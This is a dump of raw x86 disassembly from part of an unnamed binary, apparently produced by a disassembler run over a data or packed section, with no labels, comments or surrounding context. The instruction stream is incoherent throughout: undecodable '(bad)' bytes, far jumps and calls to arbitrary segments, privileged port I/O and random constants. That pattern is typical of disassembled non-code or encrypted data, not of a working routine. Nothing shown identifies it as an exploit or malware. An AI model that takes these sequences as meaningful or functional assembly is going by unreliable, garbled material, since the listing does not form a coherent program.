  41de6e:	xor    bl,dh
  41de70:	stos   BYTE PTR es:[edi],al
  41de71:	inc    ebx
  41de72:	clc    
  41de73:	std    
  41de74:	adc    ah,BYTE PTR [ebp-0x9ac8951]
  41de7a:	nop
  41de7b:	mov    DWORD PTR [ebx-0x3a],eax
  41de7e:	inc    ecx
  41de7f:	xchg   WORD PTR [esi],cx
  41de82:	and    al,0x10
  41de84:	and    dh,BYTE PTR [ebp-0x4b68df65]
  41de8a:	mul    DWORD PTR [ebx+0x71]
  41de8d:	xor    BYTE PTR [eax],dh
  41de8f:	adc    DWORD PTR [esi+0x16b946d9],esp
  41de95:	jb     0x41de6b
  41de97:	fistp  WORD PTR [ebx-0x5e]
  41de9a:	push   ds
  41de9b:	jo     0x41de7e
  41de9d:	jmp    0x644f424c
  41dea2:	pop    ebp
  41dea3:	push   cs
  41dea4:	sahf   
  41dea5:	pop    ebx
  41dea6:	retf   0x5ba5
  41dea9:	push   ecx
  41deaa:	loop   0x41dec3
  41deac:	pop    es
  41dead:	mov    ds:0x62420876,al
  41deb2:	dec    esi
  41deb3:	scas   eax,DWORD PTR es:[edi]
  41deb4:	inc    esp
  41deb5:	lock pcmpgtd mm4,QWORD PTR es:[ecx]
  41deba:	pop    esp
  41debb:	lods   al,BYTE PTR ds:[esi]
  41debc:	aad    0xdd
  41debe:	(bad)  
  41debf:	jno    0x41de8b
  41dec1:	shl    DWORD PTR [ecx+ecx*1-0x2a1306a8],0x8d
  41dec9:	int    0xc3
  41decb:	mov    fs,WORD PTR ss:[ebp-0x1b2c4ef6]
  41ded2:	retf   
  41ded3:	gs cmp al,0x25
  41ded6:	xlat   BYTE PTR ds:[ebx]
  41ded7:	or     bh,BYTE PTR [ebp-0xbfb1727]
  41dedd:	and    dh,BYTE PTR [edi]
  41dedf:	jp     0x41deb2
  41dee1:	cmp    BYTE PTR ds:0xf885c8e,0xe2
  41dee8:	imul   bh
  41deea:	fwait
  41deeb:	xchg   edi,eax
  41deec:	cld    
  41deed:	imul   DWORD PTR [ebx+0x2b]
  41def0:	cmp    bl,ah
  41def2:	jae    0x41dece
  41def4:	add    eax,0x66689e93
  41def9:	jmp    0x41de9e
  41defb:	iret   
  41defc:	xor    DWORD PTR ds:0x800bb6c5,esp
  41df02:	ins    DWORD PTR es:[edi],dx
  41df03:	punpckhbw mm6,QWORD PTR [ecx-0x14]
  41df07:	push   edx
  41df08:	adc    al,0x24
  41df0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41df0b:	inc    edi
  41df0c:	sbb    DWORD PTR [esi+0x7196cd],ebp
	...
  41df72:	add    BYTE PTR [eax],al
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x77579ce9
  41df82:	mov    bl,0x96
  41df84:	repz add DWORD PTR ds:[eax],eax
  41df88:	add    eax,0x6b000001
  41df8d:	daa    
  41df8e:	lods   al,BYTE PTR ds:[esi]
  41df8f:	cli    
  41df90:	ds inc ebp
  41df92:	lock sub esi,DWORD PTR [eax]
  41df95:	pop    ecx
  41df96:	lods   eax,DWORD PTR ds:[esi]
  41df97:	nop
  41df98:	mov    dh,0x7f
  41df9a:	les    ebx,FWORD PTR [edx+0x68]
  41df9d:	add    dh,BYTE PTR [esi-0x45b93b2c]
  41dfa3:	(bad)  
  41dfa4:	or     cl,BYTE PTR [edx-0x47053e85]
  41dfaa:	cs into 
  41dfac:	int    0x77
  41dfae:	mov    ebp,eax
  41dfb0:	xor    eax,0x4555ba59
  41dfb5:	repz pop esp
  41dfb7:	jnp    0x41dff5
  41dfb9:	ins    BYTE PTR es:[edi],dx
  41dfba:	sub    al,0x6
  41dfbc:	(bad)  
  41dfbd:	lds    esp,FWORD PTR [edi-0x10708a77]
  41dfc3:	push   esi
  41dfc4:	fwait
  41dfc5:	xor    ebp,DWORD PTR [eax]
  41dfc7:	push   cs
  41dfc8:	ss test eax,0xe201bf13
  41dfce:	loopne 0x41dfd9
  41dfd0:	push   ds
  41dfd1:	ret    
  41dfd2:	out    0xec,al
  41dfd4:	cdq    
  41dfd5:	lahf   
  41dfd6:	push   ebx
  41dfd7:	imul   edi,DWORD PTR [eax+0x412589e7],0x47
  41dfde:	jmp    0x41e02a
  41dfe0:	pop    esi
  41dfe1:	sbb    esp,DWORD PTR [ebp-0x6f]
  41dfe4:	and    eax,0x43a4f44a
  41dfe9:	jle    0x41df6c
  41dfeb:	mov    ds:0xcca28bfb,al
  41dff0:	test   BYTE PTR [edx],bl
  41dff2:	lds    esp,FWORD PTR [ecx+ecx*1+0x24805dfc]
  41dff9:	ins    DWORD PTR es:[edi],dx
  41dffa:	sar    BYTE PTR [ebp-0x1fa326d9],cl
  41e000:	cmp    al,0xe0
  41e002:	mov    edx,DWORD PTR [edi+0x14]
  41e005:	push   esp
  41e006:	mov    BYTE PTR [esi],ch
  41e008:	lds    ebx,FWORD PTR [eax]
  41e00a:	adc    bh,BYTE PTR [eax-0x26f5a97]
  41e010:	mov    ds:0xcb3cd59e,eax
  41e015:	xchg   esi,eax
  41e016:	out    dx,eax
  41e017:	jg     0x41dfe5
  41e019:	sub    cl,BYTE PTR [ecx+0x2f]
  41e01c:	jecxz  0x41e062
  41e01e:	(bad)  
  41e01f:	fidivr WORD PTR [ecx]
  41e021:	das    
  41e022:	out    dx,al
  41e023:	mov    al,ds:0x7c9cfe4d
  41e028:	adc    eax,0xa4cf96c4
  41e02d:	mov    bh,0xb2
  41e02f:	cmp    ecx,DWORD PTR [eax+0x7fb1250b]
  41e035:	and    al,0xfb
  41e037:	add    esp,ecx
  41e039:	jecxz  0x41e080
  41e03b:	ins    BYTE PTR es:[edi],dx
  41e03c:	ds in  al,dx
  41e03e:	pop    eax
  41e03f:	mov    edi,0x411dd558
  41e044:	fldenv [eax]
  41e046:	jp     0x41e084
  41e048:	test   al,0x2
  41e04a:	lods   eax,DWORD PTR ds:[esi]
  41e04b:	add    BYTE PTR [ebx],al
  41e04d:	jg     0x41e02d
  41e04f:	push   ecx
  41e050:	inc    edi
  41e051:	aas    
  41e052:	mov    ebp,0x3f3d42be
  41e057:	cmp    eax,0x624b83ce
  41e05c:	pop    dx
  41e05e:	iret   
  41e05f:	pop    edi
  41e060:	mov    dh,bl
  41e062:	sub    ebx,esp
  41e064:	fidivr WORD PTR [edx-0x68]
  41e067:	adc    al,0xe0
  41e069:	pop    edi
  41e06a:	test   al,0x7f
  41e06c:	scas   eax,DWORD PTR es:[edi]
  41e06d:	mov    bh,0x4b
  41e06f:	xchg   ecx,eax
  41e070:	mov    edx,edx
  41e072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e073:	jb     0x41e05d
  41e075:	mov    WORD PTR [esi+0x14668fe9],es
  41e07b:	loop   0x41e001
  41e07d:	mov    edx,0xa55f42d
  41e082:	and    DWORD PTR [edi-0x7],esp
  41e085:	(bad)  
  41e087:	inc    esi
  41e088:	pop    edx
  41e089:	mov    esp,0x165141b9
  41e08e:	jmp    0x0:0x3ad5
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	stos   DWORD PTR es:[edi],eax
  41e101:	inc    ebx
  41e102:	xchg   BYTE PTR [eax+0x13ff8],cl
  41e108:	add    eax,0xc9000001
  41e10d:	add    eax,0x7fccc2b5
  41e112:	pop    ebx
  41e113:	push   es
  41e114:	mov    bl,cl
  41e116:	outs   dx,DWORD PTR ds:[esi]
  41e117:	fst    QWORD PTR [edi+0x5b547593]
  41e11d:	add    eax,0x314fa135
  41e122:	or     esi,eax
  41e124:	retf   
  41e125:	mov    esp,0x254ab21e
  41e12a:	ins    BYTE PTR es:[edi],dx
  41e12b:	add    eax,0x498bcee9
  41e130:	xor    edx,DWORD PTR [ebx-0x34bd8d96]
  41e136:	pop    ecx
  41e137:	scas   al,BYTE PTR es:[edi]
  41e138:	outs   dx,BYTE PTR cs:[esi]
  41e13a:	add    eax,0x621efc0b
  41e13f:	or     eax,DWORD PTR [ebx+0x6e9a6668]
  41e145:	jl     0x41e17b
  41e147:	mov    ebx,0x56fac721
  41e14c:	push   ebx
  41e14d:	jno    0x41e15d
  41e14f:	sti    
  41e150:	and    dh,dh
  41e152:	(bad)  
  41e153:	enter  0xee,0x6e
  41e157:	jecxz  0x41e12a
  41e159:	sub    BYTE PTR [edi-0x53],0xd2
  41e15d:	mov    al,ds:0x495bb9b9
  41e162:	and    al,0x8e
  41e164:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e165:	(bad)  [ebp+0x5f]
  41e168:	mov    ss,WORD PTR [esi+0x23]
  41e16b:	xchg   ecx,eax
  41e16c:	test   eax,0xb23851a4
  41e171:	jmp    0xbb884dd4
  41e176:	pop    esp
  41e177:	test   al,0x7a
  41e179:	or     BYTE PTR [edx+0x36],dh
  41e17c:	ud1    ebx,DWORD PTR [bx+di]
  41e180:	fst    st(4)
  41e182:	(bad)
  41e185:	mov    eax,ds:0xb859960b
  41e18a:	rol    BYTE PTR [esi],cl
  41e18c:	shr    BYTE PTR [esi+0x79],cl
  41e18f:	neg    DWORD PTR [edi]
  41e191:	cli    
  41e192:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e194:	scas   al,BYTE PTR es:[edi]
  41e195:	outs   dx,DWORD PTR ds:[esi]
  41e196:	outs   dx,DWORD PTR ds:[esi]
  41e197:	in     eax,dx
  41e198:	sbb    eax,0x2603ba99
  41e19d:	adc    BYTE PTR [ecx+ebp*4+0x1],0x9
  41e1a2:	pop    ds
  41e1a3:	cdq    
  41e1a4:	mov    al,ds:0x45331fdc
  41e1a9:	scas   al,BYTE PTR es:[edi]
  41e1aa:	jmp    0xf1c:0xba5dcd18
  41e1b1:	mov    bh,0x7f
  41e1b3:	into   
  41e1b4:	inc    edi
  41e1b5:	je     0x41e152
  41e1b7:	stos   BYTE PTR es:[edi],al
  41e1b8:	mov    bl,0xe8
  41e1ba:	fisttp DWORD PTR [ebp-0x4e]
  41e1bd:	leave  
  41e1be:	and    BYTE PTR [edx],ch
  41e1c0:	sar    BYTE PTR ds:0xd11baf58,cl
  41e1c6:	outs   dx,BYTE PTR ds:[esi]
  41e1c7:	aas    
  41e1c8:	fwait
  41e1c9:	dec    edi
  41e1ca:	push   eax
  41e1cb:	lods   eax,DWORD PTR ds:[esi]
  41e1cc:	into   
  41e1cd:	mov    eax,ds:0x26af0c77
  41e1d2:	add    edi,eax
  41e1d4:	mov    dh,0x42
  41e1d6:	shr    BYTE PTR [esi],0x55
  41e1d9:	mov    BYTE PTR [edi],bh
  41e1db:	retf   
  41e1dc:	stos   DWORD PTR es:[edi],eax
  41e1dd:	pxor   mm6,mm3
  41e1e0:	xchg   ecx,eax
  41e1e1:	retf   
  41e1e2:	jp     0x41e1d0
  41e1e4:	mov    al,0xdf
  41e1e6:	add    dh,BYTE PTR [esi+0x45e450d]
  41e1ec:	nop
  41e1ed:	push   cs
  41e1ee:	push   ss
  41e1ef:	push   esp
  41e1f0:	dec    ebx
  41e1f1:	rol    BYTE PTR [esp+ebp*8],cl
  41e1f4:	stos   BYTE PTR es:[edi],al
  41e1f5:	sub    DWORD PTR [ecx-0x419ef330],ebx
  41e1fb:	ja     0x41e188
  41e1fd:	or     bh,BYTE PTR [esi]
  41e1ff:	jecxz  0x41e192
  41e201:	inc    esi
  41e202:	repz sub al,0xfc
  41e205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e206:	outs   dx,DWORD PTR ds:[esi]
  41e207:	jb     0x41e1f9
  41e209:	jb     0x41e25e
  41e20b:	add    al,0x8e
  41e20d:	fsub   DWORD PTR [esi+0xa039]
	...
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0xd
  41e281:	sar    DWORD PTR [ebx+0x5d],cl
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x48000001
  41e28d:	jle    0x41e2ee
  41e28f:	hlt    
  41e290:	call   0x471eff41
  41e295:	ret    
  41e296:	nop
  41e297:	push   cs
  41e298:	sub    eax,0x8d2dd55c
  41e29d:	sub    al,0xbd
  41e29f:	fisttp WORD PTR [esi+0x54]
  41e2a2:	in     al,dx
  41e2a3:	dec    ebx
  41e2a4:	(bad)  
  41e2a5:	push   0x9c3e3931
  41e2aa:	lahf   
  41e2ab:	sub    eax,0x93a5cbf3
  41e2b0:	jmp    0xbf49:0xf3bc1b15
  41e2b7:	mov    ebp,0x22004ad8
  41e2bc:	add    eax,ebp
  41e2be:	bound  esi,QWORD PTR [eax+0x1fd7666e]
  41e2c4:	loop   0x41e2da
  41e2c6:	jg     0x41e2cb
  41e2c8:	(bad)  
  41e2c9:	lock sti 
  41e2cb:	dec    ebx
  41e2cc:	pop    es
  41e2cd:	add    dh,0x97
  41e2d0:	mov    al,0xa1
  41e2d2:	cmp    BYTE PTR [ecx],cl
  41e2d4:	sbb    BYTE PTR [esi-0x1b],ah
  41e2d7:	pusha  
  41e2d8:	aaa    
  41e2d9:	or     ah,ch
  41e2db:	(bad)  
  41e2dc:	xchg   ebp,eax
  41e2dd:	retf   0x209f
  41e2e0:	dec    eax
  41e2e1:	sub    eax,0xd181016c
  41e2e6:	hlt    
  41e2e7:	lahf   
  41e2e8:	ins    BYTE PTR es:[edi],dx
  41e2e9:	mov    bh,0xe7
  41e2eb:	mov    ch,0x5
  41e2ed:	pop    esi
  41e2ee:	cmp    BYTE PTR [ebp-0x3d213fd5],0x69
  41e2f5:	jb     0x41e357
  41e2f7:	xor    eax,0x9f1808a7
  41e2fc:	fwait
  41e2fd:	mov    ss,esp
  41e2ff:	das    
  41e300:	(bad)  
  41e301:	loop   0x41e2a5
  41e303:	pop    eax
  41e304:	(bad)  
  41e305:	mov    bh,0x88
  41e307:	retf   
  41e308:	sahf   
  41e309:	enter  0xa364,0x22
  41e30d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e30e:	pop    esp
  41e30f:	add    dh,BYTE PTR [esi-0x17f013f9]
  41e315:	lds    ecx,FWORD PTR [edx]
  41e317:	adc    al,0xf6
  41e319:	hlt    
  41e31a:	dec    ecx
  41e31b:	(bad)  
  41e31c:	in     al,dx
  41e31d:	xor    DWORD PTR fs:[eax-0x1a],esi
  41e321:	pop    edx
  41e322:	adc    esp,DWORD PTR [edx-0x2306a350]
  41e328:	inc    esi
  41e329:	mov    ecx,0x46ae3bda
  41e32e:	cwde   
  41e32f:	fimul  WORD PTR [esi-0x26]
  41e332:	cmp    esi,DWORD PTR [ecx]
  41e334:	mov    esi,0x242a24b8
  41e339:	or     DWORD PTR [esi],ebp
  41e33b:	and    eax,DWORD PTR [edi-0xe22f6ed]
  41e341:	daa    
  41e342:	sbb    bh,BYTE PTR [esi]
  41e344:	inc    eax
  41e345:	push   edi
  41e346:	rol    DWORD PTR [esi+0x1c],1
  41e349:	aaa    
  41e34a:	rol    BYTE PTR [esi],0x63
  41e34d:	in     al,dx
  41e34e:	and    BYTE PTR [ecx],dh
  41e350:	cld    
  41e351:	sub    ebx,DWORD PTR [esi]
  41e353:	test   eax,0x5972061d
  41e358:	ins    BYTE PTR es:[edi],dx
  41e359:	cmp    eax,0xb86bb1eb
  41e35e:	shl    bh,1
  41e360:	jne    0x41e385
  41e362:	(bad)  
  41e363:	mov    al,0x71
  41e365:	sbb    bl,BYTE PTR [bx+0x9]
  41e369:	daa    
  41e36a:	pop    ds
  41e36b:	stos   BYTE PTR es:[edi],al
  41e36c:	pop    es
  41e36d:	dec    esp
  41e36e:	dec    edi
  41e36f:	sbb    ebx,eax
  41e371:	push   es
  41e372:	xor    DWORD PTR [ecx+0x3af86d75],0xe48f5a01
  41e37c:	or     DWORD PTR [ebx],eax
  41e37e:	or     BYTE PTR [ebx+edi*1+0x47],bh
  41e382:	clc    
  41e383:	test   DWORD PTR [ecx-0x3d],ebx
  41e386:	dec    esp
  41e387:	pop    esp
  41e388:	mov    bl,0x8f
  41e38a:	and    al,0xb4
  41e38c:	rcr    DWORD PTR [esi+eiz*4+0x3eeb],0x0
	...
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x508b0f09
  41e403:	test   eax,0x14202
  41e408:	add    eax,0x2c000001
  41e40d:	adc    eax,0x5ba948dc
  41e412:	add    BYTE PTR ds:0xbac74f1d,cl
  41e418:	mov    cl,0xbe
  41e41a:	and    ah,bh
  41e41c:	lods   eax,DWORD PTR ds:[esi]
  41e41d:	pop    esp
  41e41e:	jmp    0x41e472
  41e420:	and    eax,esp
  41e422:	sub    cl,BYTE PTR [ebx-0xb]
  41e425:	push   ecx
  41e426:	xor    eax,0x9f895aae
  41e42b:	es xchg ebx,eax
  41e42d:	jmp    0x8164e89
  41e432:	sbb    BYTE PTR [ebx],al
  41e434:	xor    ah,0xbd
  41e437:	mov    WORD PTR [edx-0x8],es
  41e43a:	fidivr DWORD PTR [ebp+0x17]
  41e43d:	xor    DWORD PTR [edi-0x38b0e9c0],0xfffffff7
  41e444:	jno    0x41e3f0
  41e446:	cmp    BYTE PTR [esi-0x2af994ab],dl
  41e44c:	xchg   ecx,esp
  41e44e:	xor    eax,0x28ee2016
  41e453:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e454:	push   esi
  41e455:	jo     0x41e46f
  41e457:	push   edx
  41e458:	jle    0x41e403
  41e45a:	add    eax,0x60acbe6
  41e45f:	push   ds
  41e460:	push   ebx
  41e461:	dec    BYTE PTR [edx]
  41e463:	xchg   DWORD PTR [eax-0x20],edx
  41e466:	push   ds
  41e467:	xchg   esp,eax
  41e468:	lods   eax,DWORD PTR ds:[esi]
  41e469:	aad    0x2b
  41e46b:	jl     0x41e4c1
  41e46d:	adc    eax,0x21623648
  41e472:	idiv   DWORD PTR [ecx-0x43]
  41e475:	fucomp st(3)
  41e477:	shr    DWORD PTR [eax-0x6f],0xc3
  41e47b:	out    dx,al
  41e47c:	repz cli 
  41e47e:	push   ds
  41e47f:	(bad)  
  41e480:	outs   dx,BYTE PTR ds:[esi]
  41e481:	fcomp  QWORD PTR ds:0x88b58a9c
  41e487:	cwde   
  41e488:	mov    edi,0xe2dd7527
  41e48d:	mov    dh,ch
  41e48f:	or     al,0xee
  41e491:	(bad)  
  41e492:	jnp    0x41e4d7
  41e494:	pop    esi
  41e495:	xchg   BYTE PTR [edi+esi*2+0x5539a22a],ch
  41e49c:	xor    bh,bl
  41e49e:	lahf   
  41e49f:	mov    ebx,0x445f7d77
  41e4a4:	xor    BYTE PTR [edx-0x173bb287],ch
  41e4aa:	(bad)  
  41e4ab:	xor    DWORD PTR [ebp+0x21],ebx
  41e4ae:	into   
  41e4af:	jmp    DWORD PTR gs:[edi-0x3fe8f0b8]
  41e4b6:	(bad)
  41e4b9:	addr16 pop edi
  41e4bb:	push   0x39c6f0fa
  41e4c0:	pop    ebp
  41e4c1:	cld    
  41e4c2:	dec    eax
  41e4c3:	sub    eax,0x20142aa4
  41e4c8:	cmp    DWORD PTR [edi+0xa630a27],ecx
  41e4ce:	pop    esi
  41e4cf:	mov    ebp,0x63a4bbaf
  41e4d4:	dec    ebp
  41e4d5:	sub    esp,ebp
  41e4d7:	fistp  WORD PTR [edi-0x46a2c350]
  41e4dd:	test   al,0x3b
  41e4df:	shr    BYTE PTR [ebx+0x79824e36],1
  41e4e5:	cs jge 0x41e53d
  41e4e8:	dec    edx
  41e4e9:	dec    ebx
  41e4ea:	adc    edi,edi
  41e4ec:	mov    ds:0x12bfaae,al
  41e4f1:	cmp    esp,0x19bd3888
  41e4f7:	lds    edx,FWORD PTR [eax]
  41e4f9:	inc    ebp
  41e4fa:	jle    0x41e4df
  41e4fc:	outs   dx,BYTE PTR ds:[esi]
  41e4fd:	push   eax
  41e4fe:	mov    esi,0xa3d87d69
  41e503:	xlat   BYTE PTR ds:[ebx]
  41e504:	xor    edi,ebx
  41e506:	sbb    esp,ecx
  41e508:	arpl   WORD PTR [ecx],bp
  41e50a:	xchg   edi,eax
  41e50b:	mov    ebp,DWORD PTR [ebx+ebx*1]
  41e50e:	or     cl,BYTE PTR [edx+0xfe]
	...
  41e574:	and    BYTE PTR [edx-0x35],ch
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e5a2
  41e581:	adc    BYTE PTR [eax+0x14307be],ah
  41e587:	add    BYTE PTR ds:0xea000001,al
  41e58d:	out    dx,eax
  41e58e:	retf   
  41e58f:	rcl    edx,1
  41e591:	sbb    bh,BYTE PTR [ebx]
  41e593:	jecxz  0x41e55f
  41e595:	(bad)  
  41e596:	or     BYTE PTR [edx+0x6d],cl
  41e599:	inc    BYTE PTR [ebp+0x220e9e02]
  41e59f:	inc    ecx
  41e5a0:	mov    BYTE PTR [ecx+0x76],ah
  41e5a3:	cmp    DWORD PTR [eax+esi*2-0x65],edi
  41e5a7:	(bad)
  41e5ab:	and    eax,0xb0dd254d
  41e5b0:	dec    ebp
  41e5b1:	xchg   ebp,eax
  41e5b2:	dec    edx
  41e5b3:	jmp    0x41e5b1
  41e5b5:	push   ebp
  41e5b6:	imul   esi,DWORD PTR [ebx+0x4a],0x49
  41e5ba:	sub    BYTE PTR [ebp+0x6725f3b6],0x5b
  41e5c1:	imul   esp,ebp,0x21b99e7d
  41e5c7:	push   edx
  41e5c8:	clc    
  41e5c9:	adc    DWORD PTR [edi],0xffffffcb
  41e5cc:	repz xchg ecx,eax
  41e5ce:	sbb    dh,BYTE PTR [edi]
  41e5d0:	ins    DWORD PTR es:[edi],dx
  41e5d1:	mov    esp,0xbe58a2
  41e5d6:	sbb    al,0x87
  41e5d8:	or     eax,0x7dadfe8c
  41e5dd:	add    dh,0xf8
  41e5e0:	adc    DWORD PTR [esi],esi
  41e5e2:	fwait
  41e5e3:	adc    al,0xe2
  41e5e5:	or     ah,BYTE PTR [ebp-0x56]
  41e5e8:	sbb    eax,edx
  41e5ea:	stos   DWORD PTR es:[edi],eax
  41e5eb:	fsub   st,st(0)
  41e5ed:	xor    bh,bl
  41e5ef:	jnp    0x41e5dc
  41e5f1:	mov    eax,ds:0xa8cbcac3
  41e5f6:	mov    eax,ss
  41e5f8:	repnz sbb eax,0xc98aa4bb
  41e5fe:	inc    esp
  41e5ff:	retf   0x6a8a
  41e602:	ins    BYTE PTR es:[edi],dx
  41e603:	and    eax,DWORD PTR [eax+0x53a96ee]
  41e609:	pop    ss
  41e60a:	(bad)  
  41e60b:	cmp    eax,0x65261854
  41e610:	std    
  41e611:	inc    ebx
  41e612:	ins    DWORD PTR es:[edi],dx
  41e613:	mov    dh,0xd
  41e615:	inc    edi
  41e616:	imul   esi,DWORD PTR [ebx],0x9970ab14
  41e61c:	cwde   
  41e61d:	mov    dl,0x6d
  41e61f:	jl     0x41e67b
  41e621:	jns    0x41e626
  41e623:	hlt    
  41e624:	and    ch,BYTE PTR [edx+0x3c997d71]
  41e62a:	sub    esp,0xdfc9b728
  41e630:	xchg   ecx,eax
  41e631:	and    al,0xf
  41e633:	mov    esi,0x6b138204
  41e638:	test   bl,0x68
  41e63b:	sub    edx,ecx
  41e63d:	loope  0x41e6bc
  41e63f:	in     al,0xf6
  41e641:	push   0xffffffc3
  41e643:	inc    esp
  41e644:	push   ebx
  41e645:	das    
  41e646:	mov    eax,0x2e6fae97
  41e64b:	js     0x41e6bc
  41e64d:	gs mov ch,0x8
  41e650:	sti    
  41e651:	push   es
  41e652:	push   ebp
  41e653:	nop
  41e654:	popa   
  41e655:	add    al,0xe4
  41e657:	mov    ebp,0xf0ebe486
  41e65c:	xor    DWORD PTR [esp+ecx*8-0x5936281d],ebp
  41e663:	int    0x38
  41e665:	mov    edx,0x1280a0c1
  41e66a:	inc    ebx
  41e66b:	jmp    0xe89ff3b
  41e670:	idiv   dh
  41e672:	(bad)  
  41e673:	(bad)  
  41e674:	ja     0x41e6bf
  41e676:	add    DWORD PTR [edx-0x77],ebp
  41e679:	cmp    DWORD PTR [eax],edi
  41e67b:	lods   eax,DWORD PTR cs:[esi]
  41e67d:	ss sbb dh,cl
  41e680:	xchg   BYTE PTR [ecx-0x3d],ch
  41e683:	js     0x41e6e2
  41e685:	fdiv   DWORD PTR [edi+0x1]
  41e688:	jl     0x41e6d1
  41e68a:	in     eax,0x4c
  41e68c:	loop   0x41e626
  41e68e:	das    
  41e68f:	inc    esi
  41e690:	lds    eax,FWORD PTR [eax]
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    edi,eax
  41e701:	scas   eax,DWORD PTR es:[edi]
  41e702:	and    al,0xfe
  41e704:	or     al,0x44
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0xd6000001
  41e70d:	lock dec edx
  41e70f:	add    al,0xd9
  41e711:	mov    BYTE PTR [ebp+0x61],dh
  41e714:	(bad)  
  41e715:	pop    ds
  41e716:	ret    
  41e717:	ss out dx,al
  41e719:	ss inc ebp
  41e71b:	jno    0x41e782
  41e71d:	ds pop ebx
  41e71f:	fstp   TBYTE PTR [eax]
  41e721:	xchg   bh,al
  41e723:	sahf   
  41e724:	test   BYTE PTR [edx+edi*4-0x3d],dl
  41e728:	outs   dx,DWORD PTR ds:[esi]
  41e729:	pop    esi
  41e72a:	mov    eax,ds:0x24d4f6ce
  41e72f:	neg    DWORD PTR [ebp+0x35]
  41e732:	sahf   
  41e733:	std    
  41e734:	in     al,0xb9
  41e736:	push   edx
  41e737:	fild   DWORD PTR [eax+edi*8-0x6a]
  41e73b:	pop    es
  41e73c:	push   ebp
  41e73d:	inc    ecx
  41e73e:	push   cs
  41e73f:	and    eax,0x8243faaa
  41e744:	ins    BYTE PTR es:[edi],dx
  41e745:	push   esi
  41e746:	xor    al,BYTE PTR [ebx-0x70]
  41e749:	xor    al,0xbc
  41e74b:	sbb    DWORD PTR [eax-0x4c],edi
  41e74e:	idiv   DWORD PTR [ebp+eax*2-0x49]
  41e752:	test   esp,esi
  41e754:	sbb    bh,BYTE PTR [edx]
  41e756:	and    eax,0xa489e36f
  41e75b:	sbb    eax,0x1974fccf
  41e760:	call   0x561e:0xa6e719de
  41e767:	cmp    DWORD PTR [eax],ebx
  41e769:	ror    al,0xa6
  41e76c:	dec    ebx
  41e76d:	mov    ebx,ebp
  41e76f:	inc    ebp
  41e770:	mov    DWORD PTR [edx-0x2dccb96d],0xe99060e2
  41e77a:	outs   dx,BYTE PTR ds:[esi]
  41e77b:	inc    ebx
  41e77c:	fnstenv [edx-0x29]
  41e77f:	out    0xbd,al
  41e781:	xor    al,0xaf
  41e783:	push   0xc0851c1b
  41e788:	stos   DWORD PTR es:[edi],eax
  41e789:	or     eax,edi
  41e78b:	fisubr WORD PTR [esi]
  41e78d:	(bad)  
  41e78e:	inc    ecx
  41e78f:	xor    BYTE PTR [ebx],dl
  41e791:	in     eax,dx
  41e792:	aas    
  41e793:	sub    al,0xe4
  41e795:	and    BYTE PTR [edi-0x4fdcbb41],ch
  41e79b:	lock fsubr st,st(7)
  41e79e:	xor    DWORD PTR [eax+eiz*2-0x4ae93ebe],esi
  41e7a5:	(bad)  
  41e7a6:	in     al,0xaf
  41e7a8:	push   0xfffffff8
  41e7aa:	data16 shr BYTE PTR ds:0x1264533b,cl
  41e7b1:	andnps xmm1,XMMWORD PTR [ebx+0x14]
  41e7b5:	cmp    esi,DWORD PTR [edx]
  41e7b7:	cmc    
  41e7b8:	pop    ss
  41e7b9:	lock daa 
  41e7bb:	adc    al,0x61
  41e7bd:	mov    ah,dh
  41e7bf:	jge    0x41e81b
  41e7c1:	xchg   esp,eax
  41e7c2:	popf   
  41e7c3:	xchg   DWORD PTR [esi+eax*2+0x50],ebx
  41e7c7:	or     al,0x87
  41e7c9:	(bad)  
  41e7cb:	or     al,0x7d
  41e7cd:	xor    eax,0x1c8ab530
  41e7d2:	sub    al,0x2
  41e7d4:	mov    bl,0x47
  41e7d6:	xchg   ebp,eax
  41e7d7:	and    eax,0x25d910d5
  41e7dc:	(bad)  
  41e7dd:	sub    bl,BYTE PTR [edx]
  41e7df:	cmp    DWORD PTR [edx+0x32],edi
  41e7e2:	cli    
  41e7e3:	mov    esi,0xce140658
  41e7e8:	add    edx,DWORD PTR [ebx-0x80]
  41e7eb:	sub    DWORD PTR [esi+0x2068c506],0x70
  41e7f2:	int    0xd4
  41e7f4:	aam    0xa
  41e7f6:	stos   BYTE PTR es:[edi],al
  41e7f7:	cmc    
  41e7f8:	retf   0xdb93
  41e7fb:	int    0x94
  41e7fd:	mov    bl,BYTE PTR [edx]
  41e7ff:	out    dx,al
  41e800:	cmp    esi,esi
  41e802:	imul   eax,DWORD PTR gs:[edi],0xffffff8a
  41e806:	mov    bh,bh
  41e808:	push   ebx
  41e809:	rcr    BYTE PTR [edi+0x5e],1
  41e80c:	hlt    
  41e80d:	pop    ebx
  41e80e:	or     al,0x48
  41e810:	inc    esp
	...
  41e871:	add    BYTE PTR [eax],al
